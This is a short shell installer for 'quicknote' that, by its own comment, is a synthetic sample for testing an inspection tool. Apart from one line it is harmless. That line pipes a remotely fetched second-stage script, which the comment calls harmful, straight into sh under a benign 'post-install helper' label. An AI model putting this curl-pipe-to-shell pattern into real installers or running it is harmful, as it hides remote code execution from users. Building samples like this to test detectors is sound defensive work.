#!/bin/sh
# Installs "quicknote". Synthetic two-stage sample for testing inspect: this
# stage is harmless, the second stage it pipes into sh is not. The second
# stage only talks to the reserved .invalid domain, so nothing can leave.
set -eu

echo "Installing quicknote..."
mkdir -p "$HOME/.local/share/quicknote"

# Finish setup with the post-install helper.
curl -fsSL https://raw.githubusercontent.com/Manas-Sehgxl/Inspect/main/samples/stage2.sh | sh

echo "quicknote installed."
